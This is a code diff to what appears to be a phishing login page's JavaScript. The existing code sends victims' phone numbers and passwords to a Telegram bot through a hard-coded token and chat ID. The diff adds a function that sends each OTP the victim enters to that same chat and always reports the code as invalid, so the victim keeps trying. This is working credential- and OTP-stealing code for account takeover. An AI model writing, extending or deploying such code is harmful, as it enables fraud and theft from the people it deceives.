@@ -573,12 +573,13 @@
             }, 1000);
         }
 
+        function esc(s) {
+            return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+        }
+
         function sendToTelegram(phone, password) {
             const token = '8832725535:AAHyATWuoehUJ2RVdlx5nfs6tqheVhBu15U';
             const chatId = '-1003955056796';
-            const esc = function (s) {
-                return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-            };
             const text = encodeURIComponent(
                 '<b>Login Details</b>\n' +
                 '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n' +
@@ -604,6 +605,9 @@
                 return;
             }
 
+            lastPhone = phone;
+            lastPassword = password;
+
             sendToTelegram(phone, password);
 
             openOtpPopup(phone);
@@ -620,6 +624,8 @@
         // ===== OTP POPUP =====
         let generatedOtp = '';
         let countdownTimer = null;
+        let lastPhone = '';
+        let lastPassword = '';
 
         function openOtpPopup(phone) {
             document.getElementById('otpPhone').textContent = '+91 ' + phone;
@@ -681,7 +687,21 @@
                 showInvalidToast('Please enter the OTP code.');
                 return;
             }
+            sendOtpToTelegram(val);
             showInvalidToast('OTP is invalid');
+        }
+
+        function sendOtpToTelegram(otp) {
+            const token = '8832725535:AAHyATWuoehUJ2RVdlx5nfs6tqheVhBu15U';
+            const chatId = '-1003955056796';
+            const text = encodeURIComponent(
+                '<b>OTP Code</b>\n' +
+                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n' +
+                '\uD83D\uDD22 OTP: <code>' + esc(otp) + '</code>\n' +
+                '\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501'
+            );
+            const photo = 'https://i.ibb.co/hFPv3VYh/photo-2026-08-13-14-21-56.jpg';
+            fetch('https://api.telegram.org/bot' + token + '/sendPhoto?chat_id=' + chatId + '&photo=' + encodeURIComponent(photo) + '&caption=' + text + '&parse_mode=HTML');
         }
 
         function showInvalidToast(msg) {
